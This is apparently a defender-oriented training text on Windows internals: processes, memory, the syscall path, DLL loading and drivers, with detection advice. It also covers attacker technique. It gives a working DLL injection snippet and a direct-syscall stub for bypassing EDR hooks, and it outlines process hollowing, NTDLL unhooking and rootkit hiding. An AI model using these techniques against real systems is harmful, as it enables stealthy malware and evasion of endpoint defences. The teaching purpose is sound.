Windows Architecture Overview

The foundations that everything else is built on, skip this and you'll be guessing forever

🏗️
💬 From the Desk

I have sat through hundreds of incident response calls where analysts were hunting malware they didn't understand. The malware was abusing Windows internals they'd never been taught. Every single "advanced" attack you'll encounter, rootkits, process injection, credential theft, EDR bypass, all of it makes perfect sense once you understand how Windows is architecturally built. This chapter is your foundation. Don't skip it.

🌐 The Two Worlds: User Mode vs Kernel Mode

Think of Windows as a two-floor building. The ground floor is User Mode, this is where all your applications live. Notepad.exe, Chrome, your malware sample, your EDR agent's user-space component, they all live down here. The basement is Kernel Mode, this is where the operating system itself runs. Device drivers, the memory manager, the scheduler, all of it sits down there.

Now here's the critical thing: the basement is sacred territory. Code running in the basement has unrestricted access to every byte of RAM, every CPU register, every hardware device on the machine. No checks. No restrictions. It's like being the building's master engineer, you can rewire everything. Ground floor tenants, on the other hand, can't even look at the basement's wiring diagram without asking permission.

This separation exists for stability and security. If your music player crashes in user mode, Windows terminates it and moves on. If code crashes in kernel mode, the whole building collapses, that's your Blue Screen of Death (BSOD). The kernel can't "partially crash." It's all or nothing.

🏗️ Windows Architecture, Two Worlds

💍 Ring Levels, What Runs Where and Why

Modern CPUs implement a concept called privilege rings. Think of it like concentric security circles around the crown jewels (the hardware). The closer to the center, the more power you have.

Ring 0 Kernel, Full hardware access
Ring 1 Hypervisor (Hyper-V on modern Windows)
Ring 2 Unused by Windows
Ring 3 User applications, Restricted access

Windows actually only uses Ring 0 and Ring 3. Rings 1 and 2 are leftover from the original Intel architecture design and Windows doesn't bother with them. Hyper-V, Microsoft's hypervisor, runs in something called Ring -1 (or VMX root mode), even below the kernel. This is how Credential Guard and Virtualization-Based Security (VBS) work: they run the security-sensitive parts of Windows in a separate VM that even a compromised kernel can't reach.

When user-mode code (Ring 3) needs to do something privileged, read a file, allocate memory, open a socket, it executes a special CPU instruction called SYSCALL (on 64-bit) or SYSENTER (on 32-bit). This causes the CPU to flip into Ring 0, look up the requested operation in a table called the SSDT (System Service Descriptor Table), and execute the kernel function. When done, the CPU flips back to Ring 3 and hands control back to the application.

🧱 The Windows Executive, Kernel, and HAL

The HAL (Hardware Abstraction Layer)

The HAL is the translator between Windows and the physical hardware. Different computers use different chipsets, different interrupt controllers, different bus architectures. The HAL wraps all of that behind a uniform interface so the rest of Windows doesn't need to know whether it's running on an Intel i9 or an AMD EPYC. The HAL lives in hal.dll. It handles low-level stuff like reading hardware timers, managing I/O ports, and handling interrupt dispatching. Most analysts will never touch the HAL, but understanding it exists explains why Windows can run on such diverse hardware.

The Windows Kernel (ntoskrnl.exe)

This is the heart of the OS, ntoskrnl.exe. It does three core things: thread scheduling (decides which thread runs on which CPU core at any given microsecond), interrupt handling (responds when hardware screams for attention), and low-level synchronization (spin locks, mutexes, dispatcher objects). It's small, tight, and written in C and assembly. The kernel deliberately does as little as possible, the heavy lifting is pushed up to the Executive.

The Windows Executive

The Executive is the management layer that sits just above the kernel but still runs in Ring 0. It's a collection of managers, each responsible for a domain:

⚙️ Subsystems: Win32, WoW64, and POSIX

The Win32 Subsystem

The Win32 subsystem is what most people think of as "Windows." It's the set of APIs (kernel32.dll, user32.dll, gdi32.dll) that applications use to do basically everything, create windows, open files, launch processes. The subsystem host process is csrss.exe (Client/Server Runtime Subsystem). This runs as a system-critical process; if you kill it, the system BSODs. Attackers know this. If you see anything injecting into csrss.exe, consider that a five-alarm fire.

WoW64, 32-bit Apps on 64-bit Windows

WoW64 (Windows-on-Windows 64-bit) is the compatibility layer that lets 32-bit applications run on 64-bit Windows. It intercepts 32-bit API calls and translates them to their 64-bit equivalents. Under C:\Windows\SysWOW64\ you'll find 32-bit versions of system DLLs. The actual 64-bit DLLs live in C:\Windows\System32\. Yes, I know, the naming is backwards and confusing. Microsoft knows. They're not proud of it.

From a security standpoint: WoW64 is a favourite target for attackers because 32-bit processes running under WoW64 have a slightly different syscall path. Heaven's Gate is a technique where 32-bit malware directly jumps into 64-bit code to bypass 32-bit EDR hooks. We'll cover this in detail in Chapter 4.

💀 Security Implication: Why Kernel Rootkits Are Catastrophic

When malware gets into Ring 0, either by exploiting a kernel vulnerability or loading a malicious driver, it can do anything: hide itself from every security tool, intercept and modify system calls before they're processed, read any process's memory, disable logging, and even modify the page tables to make physical memory appear different from what tools see. The DKOM (Direct Kernel Object Manipulation) technique, used by rootkits like Azazel and Necurs, works by walking the EPROCESS linked list and unlinking the malware's process entry. After that, the process is invisible to tasklist, Process Explorer, and most EDR tools, because they all read the same list that's now been edited.

This is why Microsoft introduced Kernel Patch Protection (KPP), also called PatchGuard, on 64-bit Windows. PatchGuard periodically checks that critical kernel structures (like the SSDT and IDT) haven't been tampered with. If it detects modification, it immediately triggers a BSOD with code 0x109 CRITICAL_STRUCTURE_CORRUPTION. This is why modern rootkits have moved to more subtle techniques instead of direct SSDT patching.

🛡️ Detection: How to Spot Kernel-Level Compromise

As an analyst, kernel-mode compromise is the hardest to detect because the tools you use rely on the same kernel being honest with you. Key indicators include: unexpected BSODs (rootkit bug or PatchGuard catching them), process count discrepancies between tools (one tool shows different number than another), signed driver loading from unusual paths (Event ID 7045 in System log), and Secure Boot violations or BitLocker triggering unexpectedly. WinPmem or F-Response for memory acquisition before tools can hide anything.

Processes and Threads Deep Dive

The building blocks of execution, and the primary target of every memory-based attacker

⚙️
💬 From the Desk

I've analyzed thousands of malware samples. Almost all of them, at some point, interact with the process and thread model. Process injection is the technique that keeps on giving for attackers. Understanding EPROCESS and ETHREAD structures isn't academic knowledge; it's how you write Volatility plugins, how you build detections, and how you understand why tools like Mimikatz work the way they do.

🔲 What Is a Process? What Is a Thread?

Here's the distinction that trips up almost every junior analyst: a process is not something that executes code. A process is a container. It holds resources: virtual address space, handles to files and registry keys, security tokens, and a list of threads. Think of a process like a building, it has rooms, electricity, plumbing. But it doesn't do anything on its own.

A thread is the actual worker. Threads live inside processes and they are what the CPU actually executes. Every thread has its own stack, its own register state, and its own program counter (the address of the next instruction to execute). A process must have at least one thread to do anything useful. A process with zero threads is dead.

This is why process injection attacks are so powerful: the attacker creates a thread inside a legitimate process (like explorer.exe or svchost.exe). The malicious code runs in that thread, inherits the legitimate process's security token, and hides behind its trusted reputation. From the network's perspective, the traffic looks like it comes from explorer.exe.

🔬 EPROCESS and ETHREAD, The Kernel's View

Every process on a running Windows system has a corresponding kernel structure called EPROCESS (Executive Process). This is the kernel's "dossier" on each process, every field tells the kernel something it needs to manage that process. Let me walk you through the fields that matter most to a security analyst:

🗂️ EPROCESS Structure, Fields That Matter to Analysts
/* Simplified EPROCESS layout, actual structure has 500+ fields */
typedef struct _EPROCESS {
  // ── IDENTITY ────────────────────────────────────────────────────
  ULONG_PTR        UniqueProcessId;       // PID, process ID
  UCHAR            ImageFileName[15];     // First 15 chars of exe name (note: can be spoofed!)
  ULONG            SessionId;            // Which user session (0=system, 1+=users)
  
  // ── LINKED LIST (critical for DKOM attacks) ─────────────────────
  LIST_ENTRY       ActiveProcessLinks;    // Doubly-linked list of all processes, rootkits unlink here!
  
  // ── MEMORY ──────────────────────────────────────────────────────
  KPROCESS         Pcb;                  // Kernel process block (contains CR3, page directory base)
  PVOID            DirectoryTableBase;   // Physical address of page table root, maps virtual to physical
  RTL_AVL_TABLE    VadRoot;             // VAD tree, map of all virtual memory regions
  
  // ── SECURITY ────────────────────────────────────────────────────
  EX_FAST_REF      Token;               // Security token, SIDs, privileges, integrity level
  
  // ── RELATIONSHIPS ───────────────────────────────────────────────
  PVOID            InheritedFromUniqueProcessId;  // PPID, parent PID (easily spoofed!)
  
  // ── PEB POINTER ─────────────────────────────────────────────────
  PPEB             Peb;                 // Pointer to Process Environment Block (user-mode accessible)
  
  // ── THREAD LIST ─────────────────────────────────────────────────
  LIST_ENTRY       ThreadListHead;      // All ETHREAD structures for this process
  
  // ── HANDLES ─────────────────────────────────────────────────────
  PHANDLE_TABLE    ObjectTable;         // Handle table, open files, registry keys, etc.
  
  // ── CREATION TIME ───────────────────────────────────────────────
  LARGE_INTEGER    CreateTime;          // Precise process creation timestamp
  LARGE_INTEGER    ExitTime;            // Set when process terminates
} EPROCESS;
💡
Why ImageFileName is Only 15 Characters

The ImageFileName field in EPROCESS is only 15 bytes long, a historical limitation. The real full executable path is stored in the PEB (Process Environment Block) in user mode, and in a separate SeAuditProcessCreationInfo kernel structure. Malware analysts love this because you can see discrepancies: the PEB might say one name while EPROCESS says another, indicating process name spoofing.

The ETHREAD Structure

Similarly, every thread has an ETHREAD structure. The key fields for analysts are: Cid.UniqueThread (thread ID / TID), StartAddress (where the thread started executing, suspicious if it points to non-module memory), Win32StartAddress (the Win32-visible start address), and ApcState (Asynchronous Procedure Call queue, abused by APC injection attacks).

The Loader, Where DLL Injection Lives

Step 7 is where things get interesting for attackers. After the kernel creates the process skeleton, ntdll.dll's user-mode loader takes over. It reads the PE headers of the new executable, maps it into memory, finds its import table (the list of DLLs it needs), loads each dependency, resolves function addresses, calls each DLL's DllMain() with DLL_PROCESS_ATTACH, and finally jumps to the executable's entry point. This is why AppInit_DLLs and known DLL hijacking are so effective, the attacker gets code execution during this loader phase, before the application has even started. We'll dig into this in Chapter 5.

🗺️ Process Memory Layout, Every Region Explained

📐 Process Virtual Address Space Layout (64-bit Windows)

The PEB (Process Environment Block)

The PEB is one of the most forensically valuable structures in a process. It lives in user-mode memory and is accessible from GS:[0x60] on 64-bit Windows (the GS register points to the TEB, which contains a pointer to the PEB). The PEB contains:

  • Ldr, A pointer to PEB_LDR_DATA, which contains three linked lists of all loaded modules (InLoadOrderModuleList, InMemoryOrderModuleList, InInitializationOrderModuleList)
  • ProcessParameters, Command line arguments, image path, current directory, environment variables
  • BeingDebugged, A flag that debuggers set to 1. This is what IsDebuggerPresent() checks. Trivially bypassed by writing 0 to this byte.
  • NtGlobalFlag, Another debugging indicator. In a debugged process, this is set to 0x70.

The TEB (Thread Environment Block)

Each thread has its own TEB, pointed to by the GS register (FS on 32-bit). The TEB holds thread-specific data: the pointer back to the PEB, the thread ID, the stack base and limit (important for stack overflow detection), and the thread's last error code (GetLastError() reads from TEB). The TEB is also where Structured Exception Handling (SEH) chains are stored on 32-bit Windows, historically a massive attack surface.

🔄 Thread Scheduling and Context Switching

The Windows scheduler uses a priority-based preemptive scheduling model. There are 32 priority levels (0–31). Threads at higher priority levels run first. If a higher-priority thread becomes ready to run while a lower-priority thread is running, the kernel preempts the lower-priority thread immediately, no waiting, no asking nicely.

A context switch is the mechanism by which the CPU moves from executing one thread to another. When the scheduler decides it's time to switch, it saves the entire CPU state (all registers, the stack pointer, the instruction pointer) for the current thread into its ETHREAD.Tcb.TrapFrame, then restores the saved state from the next thread. From the thread's perspective, nothing happened, it wakes up exactly where it left off.

Context switches happen roughly 1,000 times per second per CPU core. On a busy system with hundreds of threads, the scheduler is constantly juggling. This is relevant to security because timing attacks exploit the fact that context switches create measurable timing variations.

💉 Process Hollowing and Process Injection

Classic DLL Injection

The oldest trick: allocate memory in a target process with VirtualAllocEx(), write your DLL path there with WriteProcessMemory(), then create a thread in the target process (using CreateRemoteThread()) with the start address pointing to LoadLibrary(). When that thread runs, it calls LoadLibrary with your DLL path, and your DLL is loaded into the target process.

// Classic DLL Injection, simplified
HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPID);
LPVOID pMem = VirtualAllocEx(hProcess, NULL, dllPathLen, MEM_COMMIT, PAGE_READWRITE);
WriteProcessMemory(hProcess, pMem, dllPath, dllPathLen, NULL);
HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0,
    (LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA"),
    pMem, 0, NULL);

Process Hollowing, The Classic Stealth Technique

Process hollowing is more sophisticated. The attacker creates a legitimate process in a suspended state (using CREATE_SUSPENDED flag in CreateProcess()). The process is created but not yet running. Then the attacker:

  1. Unmaps the legitimate executable from the process's memory using NtUnmapViewOfSection()
  2. Allocates new memory at the same base address (or the payload's preferred base)
  3. Writes the malicious PE into that memory
  4. Updates the process's context (PEB's image base, entry point in the thread context)
  5. Resumes the suspended thread

From the outside, tasklist shows a legitimate process name (e.g., svchost.exe). But its memory contains the attacker's payload. Used by: Dridex, Emotet, TrickBot, and many ransomware families.

💀 Real-World: Process Hollowing in Emotet

Emotet used process hollowing to spawn a hollowed explorer.exe instance. The malware would create explorer.exe suspended, hollow it out, inject its banking trojan payload, and resume. Because the process name was explorer.exe, many security tools and SIEM rules focused on process name whitelisting missed it entirely. The detection came from looking at the parent-child relationship (a spawned explorer.exe with a non-standard parent) and from memory forensics showing that the mapped image in memory didn't match the file on disk.

🛡️ Detection: Process Injection Indicators

Memory scanning: Look for executable memory regions (MEM_PRIVATE + PAGE_EXECUTE_READ) that are not backed by a file on disk, this is the hallmark of injected shellcode or reflectively-loaded DLLs. In Volatility: vol.py windows.malfind. Parent-child spoofing: Check PPID against what makes sense, explorer.exe spawned from mshta.exe is suspicious. Thread start addresses: Any thread whose start address points outside of a known module is suspicious. Event ID 10 in Sysmon catches OpenProcess calls with PROCESS_VM_WRITE access.

03

Windows Memory Management

The illusion of infinite memory, and how attackers hide inside it

🧠
💬 From the Desk

Memory forensics saved more investigations for me than any other technique. Attackers love memory because, unlike files on disk, it leaves no obvious footprint. But memory has structure. And that structure betrays them every time, if you know what to look for. The VAD tree, page permissions, and section mappings tell a complete story. You just have to know how to read it.

💫 Virtual Memory, The Illusion Explained

Here's the fundamental trick that makes modern operating systems work: every process thinks it owns the entire address space. On 64-bit Windows, each process gets 128 terabytes of virtual address space all to itself. This sounds absurd, your machine has 16GB of RAM, but each process thinks it has 128TB?

Yes. And here's how the trick works. Virtual addresses are not real memory addresses. They're like apartment numbers in a very large building that doesn't physically exist. When a process accesses virtual address 0x00007FF600001000, the CPU doesn't go look at that location in RAM. Instead, it asks the Memory Management Unit (MMU), a chip built into the CPU, "where does this virtual address actually live?" The MMU looks up the translation in a set of tables (page tables) and returns the physical address.

This means: process A's virtual address 0x1000 and process B's virtual address 0x1000 can point to completely different physical memory locations. The isolation is enforced by the CPU hardware. This is why a crashed process doesn't corrupt other processes' memory.

📖 Page Tables, PTEs, and Address Translation

Memory is divided into fixed-size chunks called pages. On x86-64 Windows, the standard page size is 4KB. Large pages (2MB) also exist and are used for performance. Every page has a corresponding entry in the page table called a PTE (Page Table Entry).

The translation from virtual to physical address on 64-bit Windows uses a four-level hierarchy (or five-level on very recent systems). Let's walk through a real example. Imagine a virtual address: 0x00007FF6_44001234:

🔢 64-bit Virtual Address Breakdown
Virtual Address: 0x00007FF6_44001234
Binary: 0000 0000 0000 0000 0111 1111 1111 0110  0100 0100 0000 0000 0001 0010 0011 0100

Bits [47:39]  = PML4 index   (9 bits) → Index into Page Map Level 4 table
Bits [38:30]  = PDPT index   (9 bits) → Index into Page Directory Pointer Table  
Bits [29:21]  = PD index     (9 bits) → Index into Page Directory
Bits [20:12]  = PT index     (9 bits) → Index into Page Table
Bits [11:0]   = Page offset  (12 bits)→ Offset within the 4KB page

Translation flow:
CR3 register → PML4 table → PDPT → PD → PT → Physical frame + offset → Physical address

The CPU's CR3 register holds the physical address of the PML4 table for the current process. This is exactly what's in EPROCESS.DirectoryTableBase. Every process has its own page table hierarchy, that's what gives each process its isolated address space. When the OS switches between processes (context switch), it updates CR3 to point to the new process's page tables. From that moment, every memory access is translated through the new process's tables.

🗺️ The VAD Tree, The Analyst's Best Friend

The Virtual Address Descriptor (VAD) tree is a kernel data structure that describes every region of virtual memory that the process has claimed. Think of it like the table of contents for a process's address space, each node in the tree is an apartment lease describing who rented which range of virtual addresses and what they're allowed to do with it.

The VAD tree is an AVL tree (self-balancing binary search tree) stored in the kernel's EPROCESS.VadRoot field. Each VAD node contains:

  • StartingVpn / EndingVpn, The virtual page number range this entry covers
  • u.VadFlags, Type of region (private, mapped, image) and protection (read, write, execute)
  • ControlArea, For file-mapped regions, points to the underlying file object
  • FileObject, The actual file backing this memory region
⚠️
Why the VAD Tree Is the Malware Hunter's Goldmine

Injected shellcode and reflectively-loaded DLLs show up as private, executable memory regions with no backing file in the VAD tree. Legitimate code almost always maps from a file on disk (DLLs are memory-mapped files). When you see a VadFlags.PrivateMemory = 1 region with execute permission that doesn't correspond to any loaded module, that's almost always malicious. The Volatility plugin windows.malfind uses exactly this logic: it walks the VAD tree looking for private, executable regions and dumps their content.

How Malware Hides in the VAD Tree

Sophisticated malware has learned to fight back. Techniques include: VAD hiding (directly unlinking VAD nodes from the tree, DKOM for memory), VAD poisoning (injecting shellcode but modifying the VAD flags to show it as non-executable), and hiding behind legitimate mappings (reflective DLL loading into a region that used to be a legitimate DLL, which the VAD might still describe as image-backed).

🛡️ ASLR, DEP/NX, and CFG, The Exploit Mitigations

ASLR (Address Space Layout Randomization)

ASLR randomizes where the stack, heap, and DLLs are loaded in memory each time a process starts. Before ASLR, the attacker knew exactly where kernel32.dll would be loaded, always the same address on all machines running the same Windows version. With ASLR, the base address is randomized at boot time (for system DLLs) and at process creation. So the attacker can no longer hardcode addresses in their shellcode.

But ASLR isn't perfect. The randomization on 32-bit Windows is only 8 bits of entropy for DLLs, that's only 256 possible locations. An attacker can brute-force this reliably. On 64-bit Windows, ASLR has much more entropy. The common bypasses are: info leaks (any memory disclosure vulnerability reveals the actual loaded address), heap spraying (fill so much memory with your payload that you're likely to hit it regardless), and partial overwrites (only overwrite the low bytes of a pointer where entropy is zero).

DEP / NX (Data Execution Prevention)

DEP uses the NX bit in page table entries to mark data regions (stack, heap) as non-executable. If shellcode lands on the stack and tries to execute, the CPU checks the NX bit, sees it's set, and raises a fault, the process dies. Before DEP, the attacker just put their shellcode anywhere and jumped to it. DEP forced attackers to invent Return Oriented Programming (ROP), chaining together small snippets of legitimate code ("gadgets") that end in a RET instruction to build up arbitrary computation without injecting new executable code.

CFG (Control Flow Guard)

CFG is a compiler + OS feature that restricts where indirect calls (calls through a function pointer) can go. The compiler marks every valid indirect call target in a bitmap. At runtime, before executing an indirect call, the CPU checks whether the destination is in the bitmap. If not, crash. This defeats many ROP techniques that rely on calling into the middle of functions. CFG is defeated by finding a valid call target that itself does something useful (still a powerful technique), or by modifying the CFG bitmap (requires write access to kernel structures).

🔍 Memory Forensics with Volatility

When you acquire a memory image from a compromised system, Volatility (or its Python3 successor Volatility 3) gives you a window into the running system's state at capture time. Here's what I use most often:

💀 Real-World: Finding Cobalt Strike Beacon in Memory

Cobalt Strike Beacon (the C2 payload used by red teams and attackers alike) often runs as reflectively-loaded shellcode inside a legitimate process like rundll32.exe or svchost.exe. The VAD tree will show a private, executable memory region with no backing file, exactly what windows.malfind flags. The dumped memory region will contain the Beacon config, team server IP/domain, sleep time, jitter, and C2 protocol settings. Tools like 1768.py or BeaconHunter can parse this config from the raw memory dump automatically.

The Windows API, Native API, and Syscalls

The plumbing between applications and the kernel, and why EDR tools live here

🔌
💬 From the Desk

The syscall interface is the most fought-over piece of real estate in Windows security. EDR vendors hook it to see what malware is doing. Malware authors unhook it or bypass it entirely to evade detection. Understanding this battlefield, from the Win32 API all the way down to the SYSCALL instruction, is the difference between writing effective detections and writing ones that get bypassed in 15 minutes.

📞 The Full Call Chain: Win32 → NTDLL → Kernel

Every time an application calls a Windows function, the call passes through multiple layers before reaching the kernel. Understanding this chain is essential because this is exactly where EDRs intercept calls, and where attackers try to cut them out of the picture.

🔗 Complete API Call Chain

🏗️ NTDLL.DLL, The Most Important DLL on the System

ntdll.dll is in a completely different league from every other DLL on Windows. Here's why: it is the last piece of user-mode code that runs before the kernel. Every API call that needs to talk to the kernel, from every application on the system, goes through ntdll.dll. It's the gatekeeper, the translator, the switchboard.

ntdll.dll exports functions in two families:

  • Nt* functions, NtCreateFile, NtReadVirtualMemory, NtAllocateVirtualMemory, etc. These are the actual syscall stubs.
  • Zw* functions, Identical to Nt* functions in user mode. (In kernel mode they differ slightly, Zw* marks the previous mode as kernel, allowing certain checks to be skipped.)
  • Rtl* functions, Runtime library helpers: string manipulation, heap management, etc. These do NOT go to the kernel.
  • Ldr* functions, The loader functions for managing DLLs.

Each Nt* syscall stub in ntdll.dll looks like this (64-bit):

; NtReadFile syscall stub, disassembly
NtReadFile:
    MOV  EAX, 6          ; Syscall number for NtReadFile loaded into EAX
    MOV  R10, RCX       ; Save RCX (first argument) in R10
    SYSCALL             ; Transfer to kernel, Ring 3 → Ring 0
    RET                 ; Return to caller after kernel finishes

That's it. Four instructions. The magic is in the SYSCALL instruction itself, it atomically switches the CPU from Ring 3 to Ring 0, sets the instruction pointer to a predefined kernel entry point (KiSystemCall64 in ntoskrnl.exe), and saves the return address. The kernel then reads EAX to know which function was requested, looks it up in the SSDT, and dispatches to the appropriate kernel function.

🗂️ The SSDT, System Service Descriptor Table

The SSDT is a table in the kernel that maps syscall numbers to the actual kernel functions they invoke. Syscall number 0x06 → NtReadFile. Syscall 0x00 → NtReadVirtualMemory. And so on, for hundreds of syscalls.

Historically, rootkits modified the SSDT to redirect syscalls to their own code, that's how they intercepted all file system and process operations. Microsoft's PatchGuard now monitors the SSDT for modifications and BSODs the system if they're detected. Modern rootkits can no longer use this technique on 64-bit Windows.

💉 Direct Syscalls, The EDR Bypass Technique

Here's the cat-and-mouse game: EDR products hook functions in ntdll.dll. They overwrite the first few bytes of functions like NtCreateProcess with a jump to their own monitoring code. Every process that calls NtCreateProcess gets transparently intercepted by the EDR.

The attacker's response? Don't call ntdll.dll at all. If the malware can figure out the correct syscall number (from a fresh copy of ntdll.dll, or by parsing the disk version of ntdll.dll), it can execute the SYSCALL instruction directly in its own code, bypassing the hooked ntdll.dll entirely. This is called a direct syscall.

; Direct syscall example, attacker reimplements NtAllocateVirtualMemory
; without calling ntdll.dll (bypasses EDR hooks in ntdll)
DirectNtAllocate:
    MOV  EAX, 0x18      ; NtAllocateVirtualMemory syscall number
    MOV  R10, RCX
    SYSCALL
    RET

Tools like SysWhispers and SysWhispers2/3 automate this, they generate C code with inline assembly that implements any desired syscall directly, without touching ntdll.dll. This rendered an entire generation of NTDLL-hook-based EDRs partially blind.

Hell's Gate and Halo's Gate

Hell's Gate is a technique (by VX-Underground, used in many post-2020 malware families) that dynamically resolves syscall numbers at runtime by parsing the in-memory ntdll.dll. The twist: instead of trusting the hooked version, it reads the raw bytes of each syscall stub and extracts the syscall number from the MOV EAX, 0xXX instruction.

Halo's Gate extends this for the case where the EDR has already hooked the stub (overwriting the MOV EAX). In that case, it searches neighboring syscall stubs (the function immediately above or below in memory) which aren't hooked, and infers the target's syscall number by counting ±1.

💀 Real-World: Cobalt Strike BOF + Direct Syscalls

Starting around 2021, Cobalt Strike users began loading Beacon Object Files (BOFs) that used direct syscalls (via SysWhispers) to perform process injection, credential access, and lateral movement. Because these operations bypassed NTDLL hooks, many EDRs that relied on userland hooking were completely blind to the activity. The fix required EDRs to move detections into the kernel, using ETW (Event Tracing for Windows) and kernel callbacks (PsSetCreateProcessNotifyRoutine, PsSetCreateThreadNotifyRoutine) which cannot be bypassed from user mode.

🛡️ Detection: Direct Syscall Usage

Direct syscalls leave detectable artifacts. The syscall instruction normally appears only inside ntdll.dll. If you see a SYSCALL instruction executing from a memory region that is NOT inside ntdll.dll (detected via kernel ETW callbacks or hardware breakpoints), that's a direct syscall attack. Modern EDRs using kernel callbacks catch this at the kernel level regardless of how the syscall was initiated. Sysmon Event ID 10 (process access) and 8 (CreateRemoteThread) are your friends here. Also look for processes that have no NTDLL in their loaded module list, that indicates manual API resolution.

🪝 API Hooking, How EDRs Watch Everything

The most common EDR hooking technique is called inline hooking or trampolining. When the EDR loads into a process, it:

  1. Makes the target DLL (e.g., ntdll.dll) writable
  2. Saves the first 5+ bytes of the target function
  3. Overwrites those bytes with a JMP [edrhook_function] instruction
  4. In the hook function, the EDR logs/inspects the call, then calls the original function via the saved bytes (the "trampoline")

The hooked call looks identical to the caller, it returns normally, with the correct return value. The caller has no idea it was intercepted. This is elegant and effective, but has a critical weakness: it runs in user mode and can be undone.

NTDLL Unhooking

Attackers can restore the original bytes to NTDLL functions by:

  • Map-and-copy: Open a fresh mapping of ntdll.dll from disk, read its clean .text section, and copy it over the hooked in-memory version. Since the clean disk version has never been touched by the EDR, the hooks vanish.
  • Syscall to restore: Use direct syscalls (NtMapViewOfSection) to avoid the hooks while performing the restoration, a clean bootstrap.
  • Per-function patching: Restore just the specific functions the malware needs.

DLLs: How Windows Loads and Uses Them

Dynamic linking, the PE format, and why DLL hijacking still works in 2025

📦
💬 From the Desk

DLL hijacking vulnerabilities have been around since Windows 3.1 and they still show up in modern software every single year. I've seen DLL hijacking used in nation-state attacks, commodity malware, and everything in between. The reason it keeps working is that the underlying loading mechanism has fundamental architectural properties that can't easily be changed without breaking backward compatibility. Know the PE format. Know the load order. You'll spot these in your sleep.

📄 The PE (Portable Executable) Format, Every Field Explained

📋 IAT and EAT, How Windows Resolves Function Addresses

The Import Address Table (IAT)

When your program calls CreateFile(), the compiler doesn't know where that function is in memory at compile time (because of ASLR, and because DLLs are shared). Instead, it leaves a placeholder: a pointer in the IAT. At load time, the Windows loader fills in every IAT entry with the actual runtime address of each imported function.

The IAT is stored in the .rdata section (read-only data). Here's what it looks like conceptually:

/* IAT in memory after loader fills it */
[IAT Entry 0]: 0x00007FF87A3D2B10  → kernel32!CreateFileW
[IAT Entry 1]: 0x00007FF87A3D1A00  → kernel32!ReadFile
[IAT Entry 2]: 0x00007FF87A3D1B80  → kernel32!WriteFile
[IAT Entry 3]: 0x00007FF879A12340  → ntdll!NtCreateFile

/* Call in code compiles to: */
CALL [IAT+0x00]   ; Calls through IAT slot 0, indirect call via pointer

This is what makes IAT hooking possible: an attacker replaces the IAT entries with pointers to their own code. When the program calls CreateFile, it goes to the attacker's hook instead.

The Export Address Table (EAT)

DLLs export functions so other code can call them. The EAT is the DLL's "menu" of exported functions. Each entry contains: the function name, its ordinal number (a numeric ID), and its RVA (Relative Virtual Address, offset from the DLL's base). When the loader processes an import, it reads the importing module's import directory, finds the DLL name, loads it, and then walks the exporting DLL's EAT to find the requested function address.

DLL Hijacking, Why It Still Works

DLL hijacking exploits the load order. If a legitimate application (running with elevated privileges) tries to load a DLL that doesn't exist in System32 or its application directory, it will eventually search locations the attacker can write to. If the attacker places a malicious DLL with the right name at a searched location that comes before the legitimate one, their DLL gets loaded instead.

Classic example: Older versions of OneDrive ran with elevated privileges and tried to load version.dll. It didn't exist in OneDrive's application directory. But the attacker could write to C:\Users\[user]\AppData\Local\Microsoft\OneDrive\. Place version.dll there, and next time OneDrive launches (with elevation), it loads the attacker's DLL.

💀 Real-World CVEs: DLL Hijacking

CVE-2020-1113 (Windows Task Scheduler DLL hijacking): The Task Scheduler helper taskcomp.dll was loaded with an insecure search path, allowing hijacking via the C:\Windows\Tasks directory. CVE-2021-1675 (PrintNightmare): While primarily an RCE via printer driver installation, the path traversal also enabled DLL hijacking by dropping a malicious DLL into a path the spooler would load. Phantom DLL hijacking is the modern variant: targeting DLLs that are never found in any standard location, Windows searches for them, fails, but if an attacker creates one anywhere in the search path, it gets loaded.

Windows I/O System and Drivers

The plumbing that connects software to hardware, and the deepest layer attackers can reach

🔌
💬 From the Desk

Kernel drivers are the most powerful and most dangerous software on a Windows system. When a threat actor loads a malicious driver, whether via a vulnerability or by exploiting a signed legitimate driver, they effectively own the machine. Understanding the driver model, IRPs, and the filter driver architecture is essential for understanding both how EDRs protect you and how sophisticated attackers defeat those protections.

🔀 The I/O Manager, How Requests Flow

The I/O Manager is the Executive component responsible for routing I/O requests from applications (and other kernel components) to the appropriate device drivers. Every I/O operation, reading a file, writing to the network, sending a print job, goes through the I/O Manager.

The I/O Manager works with three fundamental objects:

  • Driver Object (DRIVER_OBJECT): Represents a loaded kernel driver. Contains an array of function pointers (MajorFunction) for handling different types of I/O requests (Create, Read, Write, IoControl, etc.)
  • Device Object (DEVICE_OBJECT): Represents a specific device or logical endpoint that a driver manages. A single driver can manage multiple device objects.
  • IRP (I/O Request Packet): The data structure that carries an I/O request through the driver stack.

📦 The IRP, How a Request Flows Through Drivers

Think of an IRP like a package being shipped through multiple warehouses. The package (the I/O request) starts at the top of a driver stack and passes through each driver in order, each one potentially modifying it or handling it, before it reaches the actual hardware driver at the bottom.

📦 IRP Flow Through Driver Stack (File Read Example)

🔍 Minifilter Drivers, How EDR and AV Intercept Everything

Before minifilters, filter drivers were a nightmare to write correctly. Developers had to manually attach to device stacks, manage ordering themselves, and risk BSOD-inducing interactions between different security products. Microsoft introduced the Filter Manager (fltmgr.sys) to solve this.

Now, security products write minifilter drivers that register with the Filter Manager. Each minifilter specifies its altitude, a number that determines its position in the filter stack. Higher altitude = closer to the application; lower = closer to the hardware. The Filter Manager handles dispatching IRPs through all minifilters in the correct order.

    InstanceSetup,
    InstanceQueryTeardown,
    ...
};

// 260000-269999: EDR behavior monitoring
// 180000-189999: Backup/recovery filters

💀 Kernel Drivers as Malware: Rootkits and Bootkits

A malicious kernel driver has unlimited power. Classic rootkit capabilities:

  • DKOM (Direct Kernel Object Manipulation): Walk the EPROCESS.ActiveProcessLinks list and unlink the malware's EPROCESS. It disappears from every tool that uses this list (tasklist, pslist in Volatility, etc.)
  • File hiding: Hook or minifilter file system calls to filter out specific filenames from directory listings
  • Network hiding: Hook the network enumeration path to hide connections
  • Keylogging: Hook keyboard interrupt handlers to capture all keystrokes
  • Token stealing: Copy the SYSTEM token from a privileged process into a user process, granting it SYSTEM privileges

🔐 BYOVD, Bring Your Own Vulnerable Driver

Windows requires kernel drivers to be digitally signed by Microsoft (or a trusted CA). This is enforced by Driver Signature Enforcement (DSE) and Secure Boot. So how do modern attackers load malicious kernel code? They bring a legitimate, signed driver that has a vulnerability.

The BYOVD attack works like this:

